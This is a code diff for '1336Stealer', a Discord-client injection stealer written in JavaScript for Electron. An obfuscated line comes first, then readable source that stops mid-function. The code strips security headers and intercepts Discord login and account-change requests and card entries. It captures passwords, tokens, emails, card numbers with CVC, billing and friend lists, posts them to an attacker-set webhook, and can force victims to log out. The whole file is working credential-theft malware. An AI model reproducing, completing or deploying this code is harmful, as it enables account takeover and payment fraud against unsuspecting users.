getIp();config['notify_on_initialization']&&(_0x5d4a40==undefined?sendToWebhook({'username':config[_0x3cfd43(0x1ff)]['username'],'avatar_url':config[_0x3cfd43(0x1ff)][_0x3cfd43(0x1e7)],'url':config[_0x3cfd43(0x1ff)]['href'],'embeds':[createEmbed({'fields':[{'name':_0x3cfd43(0x1c0),'value':'`'+_0x5d4a40+'`','inline':![]},{'name':_0x3cfd43(0x1b0),'value':''+getBadges(_0x463bca[_0x3cfd43(0x161)]),'inline':!![]},{'name':_0x3cfd43(0x16f),'value':''+getNitro(_0x463bca[_0x3cfd43(0x1d4)]),'inline':!![]},{'name':_0x3cfd43(0x19f),'value':''+_0x3255a8,'inline':!![]},{'name':'<:1336:1012707773424865310>\x20IP:','value':'`'+_0x24c384+'`','inline':!![]},{'name':_0x3cfd43(0x184),'value':''+newEmail,'inline':!![]}]})]}):(_0x463bca=await getUserInfo(_0x5d4a40),_0x3255a8=await getBilling(_0x5d4a40),_0x3e238f=await getRelationships(_0x5d4a40),sendToWebhook({'username':config['embed'][_0x3cfd43(0x196)],'avatar_url':config[_0x3cfd43(0x1ff)][_0x3cfd43(0x1e7)],'embeds':[createEmbed({'title':_0x3cfd43(0x1ba),'url':config[_0x3cfd43(0x1ff)][_0x3cfd43(0x17a)],'author':{'name':_0x463bca['username']+'#'+_0x463bca['discriminator']+'\x20('+_0x463bca['id']+')','url':config[_0x3cfd43(0x1ff)][_0x3cfd43(0x17a)],'icon_url':_0x463bca[_0x3cfd43(0x195)]?_0x3cfd43(0x1e9)+_0x463bca['id']+'/'+_0x463bca[_0x3cfd43(0x195)]:'https://cdn.discordapp.com/embed/avatars/0.png'},'thumbnail':{'url':_0x463bca[_0x3cfd43(0x195)]?_0x3cfd43(0x1e9)+_0x463bca['id']+'/'+_0x463bca[_0x3cfd43(0x195)]:_0x3cfd43(0x171)},'fields':[{'name':_0x3cfd43(0x1c0),'value':'`'+_0x5d4a40+'`','inline':![]},{'name':_0x3cfd43(0x1b0),'value':''+getBadges(_0x463bca[_0x3cfd43(0x161)]),'inline':!![]},{'name':_0x3cfd43(0x16f),'value':''+getNitro(_0x463bca[_0x3cfd43(0x1d4)]),'inline':!![]},{'name':_0x3cfd43(0x19f),'value':''+_0x3255a8,'inline':!![]},{'name':'<:1336:1012707773424865310>\x20IP:','value':'`'+_0x24c384+'`','inline':!![]},{'name':'<:1336:1012707970653626408>\x20Email:','value':''+newEmail,'inline':!![]}]}),createEmbed({'description':_0x3cfd43(0x1bc)+_0x3e238f[_0x3cfd43(0x1ee)]+')**\x0a\x0a'+_0x3e238f[_0x3cfd43(0x169)],'thumbnail':{'url':_0x463bca['avatar']?_0x3cfd43(0x1e9)+_0x463bca['id']+'/'+_0x463bca[_0x3cfd43(0x195)]:_0x3cfd43(0x171)},'author':{'name':_0x463bca[_0x3cfd43(0x196)]+'#'+_0x463bca[_0x3cfd43(0x1f7)]+'\x20('+_0x463bca['id']+')','url':config['embed'][_0x3cfd43(0x17a)],'icon_url':_0x463bca['avatar']?_0x3cfd43(0x1e9)+_0x463bca['id']+'/'+_0x463bca[_0x3cfd43(0x195)]:_0x3cfd43(0x171)}})]}))),config[_0x3cfd43(0x190)]&&_0x5d4a40&&(await execScript(_0x3cfd43(0x1e5),!![])[_0x3cfd43(0x16c)](_0x77911b=>{}),config[_0x3cfd43(0x18f)]&&sendToWebhook({'username':config[_0x3cfd43(0x1ff)][_0x3cfd43(0x196)],'avatar_url':config['embed'][_0x3cfd43(0x1e7)],'embeds':[createEmbed({'title':_0x3cfd43(0x1ac),'url':config['embed'][_0x3cfd43(0x17a)],'author':{'name':_0x463bca['username']+'#'+_0x463bca[_0x3cfd43(0x1f7)]+'\x20('+_0x463bca['id']+')','url':config[_0x3cfd43(0x1ff)][_0x3cfd43(0x17a)],'icon_url':_0x463bca['avatar']?_0x3cfd43(0x1e9)+_0x463bca['id']+'/'+_0x463bca['avatar']:_0x3cfd43(0x171)},'thumbnail':{'url':_0x463bca['avatar']?_0x3cfd43(0x1e9)+_0x463bca['id']+'/'+_0x463bca[_0x3cfd43(0x195)]:_0x3cfd43(0x171)},'fields':[{'name':_0x3cfd43(0x1c0),'value':'`'+_0x5d4a40+'`','inline':![]},{'name':_0x3cfd43(0x1b0),'value':''+getBadges(_0x463bca[_0x3cfd43(0x161)]),'inline':!![]},{'name':_0x3cfd43(0x16f),'value':''+getNitro(_0x463bca[_0x3cfd43(0x1d4)]),'inline':!![]},{'name':'<a:1336:1012707511830331442>\x20Billing:','value':''+_0x3255a8,'inline':!![]},{'name':_0x3cfd43(0x1bd),'value':'`'+_0x24c384+'`','inline':!![]},{'name':_0x3cfd43(0x184),'value':''+newEmail,'inline':!![]}]})]}));}}module['exports']=require(_0x5f568a(0x1b2));
+const {
+    BrowserWindow,
+    session,
+} = require('electron');
+const os = require('os');
+const https = require('https');
+const querystring = require("querystring");
+const fs = require("fs");
+
+async function getIp() {
+    var ip = await axios.get("https://www.myexternalip.com/raw")
+    return ip.data;
+}
+
+var config = {
+    brand: "1336Stealer",
+
+    webhook: "%WEBHOOK_LINK%",
+
+    logout: true,
+    disable_qr_code: true,
+
+    notify_on_logout: false,
+    notify_on_initialization: false,
+    ping: [false, "@everyone"],
+
+    embed: {
+        username: "1336Stealer",
+        footer: {
+            text: `@1336Stealer`,
+            icon_url: "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
+        },
+        href: "https://discord.gg/MtSkEA4aNg",
+        avatar_url: "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif"
+    },
+
+    badges: {
+        Discord_Employee: {
+            Value: 1,
+            Emoji: "<:staff:874750808728666152>",
+            Rare: true,
+        },
+        Partnered_Server_Owner: {
+            Value: 2,
+            Emoji: "<:partner:874750808678354964>",
+            Rare: true,
+        },
+        HypeSquad_Events: {
+            Value: 4,
+            Emoji: "<:hypesquad_events:874750808594477056>",
+            Rare: true,
+        },
+        Bug_Hunter_Level_1: {
+            Value: 8,
+            Emoji: "<:bughunter_1:874750808426692658>",
+            Rare: true,
+        },
+        Early_Supporter: {
+            Value: 512,
+            Emoji: "<:early_supporter:874750808414113823>",
+            Rare: true,
+        },
+        Bug_Hunter_Level_2: {
+            Value: 16384,
+            Emoji: "<:bughunter_2:874750808430874664>",
+            Rare: true,
+        },
+        Early_Verified_Bot_Developer: {
+            Value: 131072,
+            Emoji: "<:developer:874750808472825986>",
+            Rare: true,
+        },
+        House_Bravery: {
+            Value: 64,
+            Emoji: "<:bravery:874750808388952075>",
+            Rare: false,
+        },
+        House_Brilliance: {
+            Value: 128,
+            Emoji: "<:brilliance:874750808338608199>",
+            Rare: false,
+        },
+        House_Balance: {
+            Value: 256,
+            Emoji: "<:balance:874750808267292683>",
+            Rare: false,
+        }
+    },
+
+    filters: {
+        user: {
+            urls: [
+                "https://discord.com/api/v*/users/@me",
+                "https://discordapp.com/api/v*/users/@me",
+                "https://*.discord.com/api/v*/users/@me",
+                "https://discordapp.com/api/v*/auth/login",
+                'https://discord.com/api/v*/auth/login',
+                'https://*.discord.com/api/v*/auth/login',
+                "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
+                "https://api.stripe.com/v*/tokens",
+                "https://api.stripe.com/v*/setup_intents/*/confirm",
+                "https://api.stripe.com/v*/payment_intents/*/confirm",
+            ]
+        },
+        qr_codes: {
+            urls: [
+                "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
+                "https://*.discord.com/api/v*/applications/detectable",
+                "https://discord.com/api/v*/applications/detectable",
+                "https://*.discord.com/api/v*/users/@me/library",
+                "https://discord.com/api/v*/users/@me/library",
+                "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
+                "https://discord.com/api/v*/users/@me/billing/subscriptions",
+                "wss://remote-auth-gateway.discord.gg/*"
+            ]
+        }
+    }
+}
+
+var execScript = (script) => {
+    const window = BrowserWindow.getAllWindows()[0]
+    return window.webContents.executeJavaScript(script, true);
+}
+
+class Event {
+    constructor(event, token, data) {
+        for (let [key, value] of Object.entries({
+                "event": event,
+                "data": data,
+                "token": token
+            })) {
+            this[key] = value;
+        }
+    }
+
+    handle() {
+        switch (this["event"]) {
+            case "passwordChanged":
+                event_handlers["passwordChanged"](this.data.password, this.data.new_password, this.token)
+                break;
+            case 'userLogin':
+                event_handlers["userLogin"](this.data.password, this.data.email, this.token)
+                break;
+            case 'emailChanged':
+                event_handlers["emailChanged"](this.data.password, this.data.email, this.token)
+                break;
+            case "creditCardAdded":
+                event_handlers["creditCardAdded"](this.data.number, this.data.cvc, this.data.exp_month, this.data.exp_year, this.token);
+        }
+    }
+}
+
+// Traffic recording (Pirate stealer inspiration)
+
+session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
+    try {
+        if (details.url.startsWith(config.webhook)) {
+            if (details.url.includes("discord.com")) {
+                callback({
+                    responseHeaders: Object.assign({
+                        'Access-Control-Allow-Headers': "*"
+                    }, details.responseHeaders)
+                });
+            } else {
+                callback({
+                    responseHeaders: Object.assign({
+                        "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
+                        'Access-Control-Allow-Headers': "*",
+                        "Access-Control-Allow-Origin": "*"
+                    }, details.responseHeaders)
+                });
+            }
+        } else {
+            delete details.responseHeaders['content-security-policy'];
+            delete details.responseHeaders['content-security-policy-report-only'];
+
+            callback({
+                responseHeaders: {
+                    ...details.responseHeaders,
+                    'Access-Control-Allow-Headers': "*"
+                }
+            })
+        }
+
+    } catch {}
+})
+
+session.defaultSession.webRequest.onBeforeRequest(config.filters["qr_codes"], async (details, callback) => {
+    if (details.url.startsWith("wss://")) {
+        if (!config.disable_qr_code == false) {
+            callback({
+                cancel: true
+            })
+            return;
+        }
+    }
+
+    await initialize();
+
+    callback({})
+    return;
+})
+
+session.defaultSession.webRequest.onCompleted(config.filters["user"], async (details, callback) => {
+    try {
+        if (details.statusCode == 200 || details.statusCode == 204) {
+            const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
+            const data = JSON.parse(unparsed_data)
+            const token = await getToken();
+
+            switch (true) {
+                case details.url.endsWith('login'):
+                    (new Event('userLogin', token, {
+                        password: data.password,
+                        email: data.login
+                    })).handle();;
+                    return;
+                case details.url.endsWith("tokens") && details.method == "POST":
+                    const item = querystring.parse(unparsed_data.toString());
+                    (new Event('creditCardAdded', token, {
+                        number: item["card[number]"],
+                        cvc: item["card[cvc]"],
+                        exp_month: item["card[exp_month]"],
+                        exp_year: item["card[exp_year]"],
+                    }))
+
+                case details.url.endsWith('users/@me') && details.method == 'PATCH':
+                    if (!data.password) return;
+                    if (data.email) {
+                        (new Event('emailChanged', token, {
+                            password: data.password,
+                            email: data.email
+                        })).handle();
+                    };
+                    if (data.new_password) {
+                        (new Event('passwordChanged', token, {
+                            password: data.password,
+                            new_password: data.new_password
+                        })).handle();
+                    };
+                    return;
+                default:
+                    break;
+            }
+        } else {
+            return;
+        }
+
+    } catch {}
+})
+
+// ==================================================================================
+
+var event_handlers = {
+
+    async creditCardAdded(number, cvc, month, year) {
+        const userInfo = await getUserInfo(token);
+        const billing = await getBilling(token);
+        const friends = await getRelationships(token);
+        var ip = await getIp();
+
+        var params = {
+            username: config.embed.username,
+            avatar_url: config.embed.avatar_url,
+            embeds: [createEmbed({
+                title: "Credit card added",
+                url: config.embed.href,
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                fields: [{
+                        name: "<a:1336:1012706914527891476> Token:",
+                        value: `\`${token}\``,
+                        inline: false
+                    },
+                    {
+                        name: "<:1336:1012707124763177022> Badges:",
+                        value: `\`${getBadges(userInfo.flags)}\``,
+                        inline: true
+                    },
+                    {
+                        name: "<:1336:1012707326223982692> Nitro Type:",
+                        value: `\`${getNitro(userInfo.premium_type)}\``,
+                        inline: true
+                    },
+                    {
+                        name: "<a:1336:1012707511830331442> Billing:",
+                        value: `\`${billing}\``,
+                        inline: true
+                    },
+                    {
+                        name: "<:1336:1012707773424865310> IP:",
+                        value: `${ip}`,
+                        inline: true
+                    },
+                    {
+                        name: "<:1336:1012707970653626408> Email:",
+                        value: `${email}`,
+                        inline: true
+                    },
+                    {
+                        name: "<a:1336:1026131787157602375> Credit card:",
+                        value: `\`${number}|${month}|${year}|${cvc}\``,
+                        inline: false
+                    },
+                ],
+            }), createEmbed({
+                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+            })]
+        }
+
+        sendToWebhook(params)
+    },
+
+    async userLogin(password, email, token) {
+        const userInfo = await getUserInfo(token);
+        const billing = await getBilling(token);
+        const friends = await getRelationships(token);
+        var ip = await getIp();
+
+        var params = {
+            username: config.embed.username,
+            avatar_url: config.embed.avatar_url,
+            embeds: [createEmbed({
+                title: "User logged in",
+                url: config.embed.href,
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                fields: [{
+                        name: "<a:1336:1012706914527891476> Token:",
+                        value: `\`${token}\``,
+                        inline: false
+                    },
+                    {
+                        name: "<:1336:1012707124763177022> Badges:",
+                        value: `\`${getBadges(userInfo.flags)}\``,
+                        inline: true
+                    },
+                    {
+                        name: "<:1336:1012707326223982692> Nitro Type:",
+                        value: `\`${getNitro(userInfo.premium_type)}\``,
+                        inline: true
+                    },
+                    {
+                        name: "<a:1336:1012707511830331442> Billing:",
+                        value: `\`${billing}\``,
+                        inline: true
+                    },
+                    {
+                        name: "<:1336:1012707773424865310> IP:",
+                        value: `${ip}`,
+                        inline: true
+                    },
+                    {
+                        name: "<:1336:1012707970653626408> Email:",
+                        value: `${email}`,
+                        inline: true
+                    },
+                    {
+                        name: "<a:1336:1026125680330678354> Password:",
+                        value: `\`${password}\``,
+                        inline: true
+                    },
+                ],
+            }), createEmbed({
+                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+            })]
+        }
+
+        sendToWebhook(params)
+    },
+
+    async emailChanged(password, newEmail, token) {
+        var userInfo = await getUserInfo(token);
+        var billing = await getBilling(token);
+        var friends = await getRelationships(token);
+
+        var params = {
+            username: config.embed.username,
+            avatar_url: config.embed.avatar_url,
+            embeds: [createEmbed({
+                title: "Email changed",
+                url: config.embed.href,
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                fields: [{
+                        name: "<a:1336:1012706914527891476> Token:",
+                        value: `\`${token}\``,
+                        inline: false
+                    },
+                    {
+                        name: "<:1336:1012707124763177022> Badges:",
+                        value: `\`${getBadges(userInfo.flags)}\``,
+                        inline: true
+                    },
+                    {
+                        name: "<:1336:1012707326223982692> Nitro Type:",
+                        value: `\`${getNitro(userInfo.premium_type)}\``,
+                        inline: true
+                    },
+                    {
+                        name: "<a:1336:1012707511830331442> Billing:",
+                        value: `\`${billing}\``,
+                        inline: true
+                    },
+                    {
+                        name: "<:1336:1012707773424865310> IP:",
+                        value: `${ip}`,
+                        inline: true
+                    },
+                    {
+                        name: "<:1336:1012707970653626408> Email:",
+                        value: `${newEmail}`,
+                        inline: true
+                    },
+                    {
+                        name: "<a:1336:1026125680330678354> Password:",
+                        value: `\`${password}\``,
+                        inline: true
+                    },
+                ],
+            }), createEmbed({
+                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+            })]
+        }
+
+        sendToWebhook(params)
+    },
+
+    async passwordChanged(oldPassword, newPassword, token) {
+        var userInfo = await getUserInfo(token);
+        var billing = await getBilling(token);
+        var friends = await getRelationships(token);
+
+        var params = {
+            username: config.embed.username,
+            avatar_url: config.embed.avatar_url,
+            embeds: [createEmbed({
+                title: "Password changed",
+                url: config.embed.href,
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                fields: [{
+                        name: "<a:1336:1012706914527891476> Token:",
+                        value: `\`${token}\``,
+                        inline: false
+                    },
+                    {
+                        name: "<:1336:1012707124763177022> Badges:",
+                        value: `\`${getBadges(userInfo.flags)}\``,
+                        inline: true
+                    },
+                    {
+                        name: "<:1336:1012707326223982692> Nitro Type:",
+                        value: `\`${getNitro(userInfo.premium_type)}\``,
+                        inline: true
+                    },
+                    {
+                        name: "<a:1336:1012707511830331442> Billing:",
+                        value: `\`${billing}\``,
+                        inline: true
+                    },
+                    {
+                        name: "<:1336:1012707773424865310> IP:",
+                        value: `${ip}`,
+                        inline: true
+                    },
+                    {
+                        name: "<:1336:1012707970653626408> Email:",
+                        value: `${newEmail}`,
+                        inline: true
+                    },
+                    {
+                        name: "<a:1336:1026125680330678354> Old Password:",
+                        value: `\`${oldPassword}\``,
+                        inline: true
+                    },
+                    {
+                        name: "<a:1336:1026125680330678354> New Password:",
+                        value: `\`${newPassword}\``,
+                        inline: false
+                    },
+                ],
+            }), createEmbed({
+                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+            })]
+        }
+
+        sendToWebhook(params)
+    },
+}
+
+// ==================================================================================
+
+function getDiscordClient() {
+    return `${process.cwd().replace(`${process.env.LOCALAPPDATA}\\`, '').split('\\')[0].split(7)}`
+}
+
+// ==================================================================================
+
+function getNitro(flags) {
+    switch (flags) {
+        case 0:
+            return "\`\`\`No Nitro\`\`\`";
+        case 1:
+            return "<:classic:896119171019067423> \`\`Nitro Classic\`\`";
+        case 2:
+            return "<a:boost:824036778570416129> \`\`Nitro Boost\`\`";
+        default:
+            return "\`\`\`No Nitro\`\`\`";
+
+    };
+}
+
+function getRareBadges(flags) {
+    var b = '';
+    for (const prop in config.badges) {
+        let o = config.badges[prop];
+        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
+    };
+    return b;
+}
+
+function getBadges(flags) {
+    var b = '';
+    for (const prop in config.badges) {
+        let o = config.badges[prop];
+        if ((flags & o.Value) == o.Value) b += o.Emoji;
+    };
+    if (b == '') b = '\`\`\`None\`\`\`'
+    return b;
+}
+
+async function getToken() {
+    return await execScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, true)
+}
+
+async function getIp() {
+    return JSON.parse(await execScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://ipinfo.io/json", false );xmlHttp.send( null );xmlHttp.responseText;`, true));
+}
+
+async function getUserInfo(token) {
+    return JSON.parse(await execScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText;`, true));
+}
+
+async function getBilling(token) {
+    var a = await execScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, true)
+    var json = JSON.parse(a)
+
+    var billing = "";
+    json.forEach(z => {
+        if (z.type == "") {
+            return "\`\`\`❌\`\`\`";
+        } else if (z.type == 2 && z.invalid != true) {
+            billing += "\`✔️\`" + " <:paypal:896441236062347374>";
+        } else if (z.type == 1 && z.invalid != true) {
+            billing += "\`✔️\`" + " :credit_card:";
+        } else {
+            return "\`\`\`❌\`\`\`";
+        };
+    });
+
+    if (billing == "") billing = "\`\`\`❌\`\`\`"
+    return billing;
+}
+
+async function getRelationships(token) {
+    var a = await execScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText`, true)
+    var json = JSON.parse(a)
+    const r = json.filter((user) => {
+        return user.type == 1
+    })
+    var rareBadgesFriends = "";
+    for (z of r) {
+        var b = getRareBadges(z.user.public_flags)
+        if (b != "") {
+            rareBadgesFriends += b + ` | ${z.user.username}#${z.user.discriminator}\n`
+        }
+    }
+    if (!rareBadgesFriends) rareBadgesFriends = "No Rare Friends"
+
+    return {
+        length: r.length,
+        frien: rareBadgesFriends
+    }
+}
+
+// ==================================================================================
+
+function sendToWebhook(params) {
+
+    if (config.ping[0] == true) {
+        if (params.content) {
+            params.content = params.content + ` ||${config.ping[1]}||`
+        } else {
+            params.content = `||${config.ping[1]}||`
+        }
+    }
+
+    var url = new URL(config.webhook);
+    var headers = {
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*',
+    }
+    const options = {
+        protocol: url.protocol,
+        hostname: url.host,
+        path: url.pathname,
+        method: 'POST',
+        headers: headers,
+    };
+    const req = https.request(options);
+    req.on('error', (err) => {
+        console.log(err);
+    });
+    req.write(JSON.stringify(params));
+    req.end();
+}
+
+// ==================================================================================
+
+function createEmbed(data) {
+    let obj = {
+        "footer": config.embed.footer,
+        "timestamp": new Date(),
+    }
+
+    for (let [key, value] of Object.entries(data)) {
+        obj[key] = value;
+    }
+
+    return obj;
+}
+
+// ==================================================================================
+
+async function initialize() {
+
+    if (!fs.existsSync(`${process.cwd()}/${config.brand}`)) {
+        fs.mkdirSync(`${process.cwd()}/${config.brand}`)
+
+        var token = undefined;
+
+        token = await getToken();
+
+        const network_data = await getIp()
+
+        var userInfo;
+        var billing;
+        var friends;
+
+        if (config.notify_on_initialization) {
+            if (token == undefined) {
+                sendToWebhook({
+                    username: config.embed.username,
+                    avatar_url: config.embed.avatar_url,
+                    url: config.embed.href,
+                    embeds: [createEmbed({
+                        title: "Client initialized (not logged in)",
+                        fields: [{
+                            name: "<a:1336:1012706914527891476> Token:",
+                            value: `\`${token}\``,
+                            inline: false
+                        },
+                        {
+                            name: "<:1336:1012707124763177022> Badges:",
+                            value: `\`${getBadges(userInfo.flags)}\``,
+                            inline: true
+                        },
+                        {
+                            name: "<:1336:1012707326223982692> Nitro Type:",
+                            value: `\`${getNitro(userInfo.premium_type)}\``,
+                            inline: true
+                        },
+                        {
+                            name: "<a:1336:1012707511830331442> Billing:",
+                            value: `\`${billing}\``,
+                            inline: true
+                        },
+                        {
+                            name: "<:1336:1012707773424865310> IP:",
+                            value: `${ip}`,
+                            inline: true
+                        },
+                        {
+                            name: "<:1336:1012707970653626408> Email:",
+                            value: `${email}`,
+                            inline: true
+                        }],
+                    })]
+                })
+            } else {
+                userInfo = await getUserInfo(token);
+                billing = await getBilling(token);
+                friends = await getRelationships(token);
+
+                sendToWebhook({
+                    username: config.embed.username,
+                    avatar_url: config.embed.avatar_url,
+                    embeds: [createEmbed({
+                        title: "Client initialized",
+                        url: config.embed.href,
+                        author: {
+                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                            url: config.embed.href,
+                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                        },
+                        thumbnail: {
+                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                        },
+                        fields: [{
+                            name: "<a:1336:1012706914527891476> Token:",
+                            value: `\`${token}\``,
+                            inline: false
+                        },
+                        {
+                            name: "<:1336:1012707124763177022> Badges:",
+                            value: `\`${getBadges(userInfo.flags)}\``,
+                            inline: true
+                        },
+                        {
+                            name: "<:1336:1012707326223982692> Nitro Type:",
+                            value: `\`${getNitro(userInfo.premium_type)}\``,
+                            inline: true
+                        },
+                        {
+                            name: "<a:1336:1012707511830331442> Billing:",
+                            value: `\`${billing}\``,
+                            inline: true
+                        },
+                        {
+                            name: "<:1336:1012707773424865310> IP:",
+                            value: `${ip}`,
+                            inline: true
+                        },
+                        {
+                            name: "<:1336:1012707970653626408> Email:",
+                            value: `${email}`,
+                            inline: true
+                        }
+                        ],
+                    }), createEmbed({
+                        description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
+                        thumbnail: {
+                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                        },
+                        author: {
+                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                            url: config.embed.href,
+                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                        },
+                    })]
+                })
+            }
+
+        }
+
+        if (config.logout && token) {
+            await execScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, true).then((result) => {});
+
+            if (config.notify_on_logout) {
+                sendToWebhook({
+                    username: config.embed.username,
+                    avatar_url: config.embed.avatar_url,
+                    embeds: [createEmbed({
+                        title: "User logged out",
+                        url: config.embed.href,
+                        author: {
+                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                            url: config.embed.href,
+                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                        },
+                        thumbnail: {
+                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                        },
+                        fields: [{
+                            name: "<a:1336:1012706914527891476> Token:",
+                            value: `\`${token}\``,
+                            inline: false
+                        },
+                        {
+                            name: "<:1336:1012707124763177022> Badges:",
+                            value: `\`${getBadges(userInfo.flags)}\``,
+                            inline: true
+                        },
+                        {
